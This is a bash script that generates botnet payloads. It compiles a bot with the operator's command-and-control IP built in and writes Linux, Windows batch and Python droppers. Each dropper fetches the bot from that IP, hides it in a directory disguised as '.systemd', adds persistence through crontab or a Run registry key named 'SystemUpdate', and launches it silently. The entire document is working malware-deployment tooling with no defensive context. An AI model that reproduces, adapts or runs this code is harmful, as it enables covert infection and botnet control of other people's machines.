#!/bin/bash

# Payload Generator for Botnet Deployment

OUTPUT_DIR="generated_payloads"
mkdir -p "$OUTPUT_DIR"

# Get user's IP address
read -p "Enter your Kali IP address: " IP

# Update the bot binary with the new IP
sed -i "s/SERVER \"127.0.0.1\"/SERVER \"$IP\"/" lib/macros.h
gcc -lcurl lib/connect.c lib/utils.c bot.c -o "$OUTPUT_DIR/slave"

# Create different payload types

# 1. Simple binary
cp "$OUTPUT_DIR/slave" "$OUTPUT_DIR/slave-binary"
chmod +x "$OUTPUT_DIR/slave-binary"

# 2. Shell script installer
cat > "$OUTPUT_DIR/install.sh" << EOF
#!/bin/bash
# Botnet Installation Script

# Create a hidden directory
mkdir -p /tmp/.systemd

# Download the bot binary
wget -q -O /tmp/.systemd/slave http://$IP/slave-binary

# Make it executable
chmod +x /tmp/.systemd/slave

# Add to crontab for persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.systemd/slave") | crontab -

# Execute in background
nohup /tmp/.systemd/slave > /dev/null 2>&1 &
EOF

chmod +x "$OUTPUT_DIR/install.sh"

# 3. Windows batch file (for cross-platform deployment)
cat > "$OUTPUT_DIR/install.bat" << EOF
@echo off
REM Botnet Installation Script for Windows

REM Create a hidden directory
mkdir %TEMP%\.systemd 2>nul

REM Download the bot binary (would need to compile for Windows)
powershell -Command "Invoke-WebRequest -Uri 'http://$IP/slave-windows.exe' -OutFile '%TEMP%\.systemd\slave.exe'"

REM Add to registry for persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "%TEMP%\.systemd\slave.exe" /f

REM Execute in background
start /B %TEMP%\.systemd\slave.exe
EOF

# 4. Python dropper
cat > "$OUTPUT_DIR/dropper.py" << EOF
#!/usr/bin/env python3
# Botnet Python Dropper

import os
import urllib.request
import subprocess
import platform

def install_bot():
    # Create a hidden directory
    if platform.system() == "Windows":
        temp_dir = os.path.join(os.environ["TEMP"], ".systemd")
        bot_url = "http://$IP/slave-windows.exe"
        bot_path = os.path.join(temp_dir, "slave.exe")
    else:
        temp_dir = "/tmp/.systemd"
        bot_url = "http://$IP/slave-binary"
        bot_path = os.path.join(temp_dir, "slave")
    
    os.makedirs(temp_dir, exist_ok=True)
    
    # Download the bot binary
    urllib.request.urlretrieve(bot_url, bot_path)
    
    # Make it executable
    os.chmod(bot_path, 0o755)
    
    # Add persistence
    if platform.system() == "Windows":
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, bot_path)
    else:
        # Add to crontab
        cron_cmd = f"*/5 * * * * {bot_path}"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -", shell=True)
    
    # Execute in background
    if platform.system() == "Windows":
        subprocess.Popen([bot_path], close_fds=True)
    else:
        subprocess.Popen([bot_path], close_fds=True)

if __name__ == "__main__":
    install_bot()
EOF

chmod +x "$OUTPUT_DIR/dropper.py"

echo "Payloads generated in $OUTPUT_DIR directory:"
echo "1. slave-binary - Raw binary"
echo "2. install.sh - Shell script installer"
echo "3. install.bat - Windows batch installer"
echo "4. dropper.py - Python cross-platform dropper"
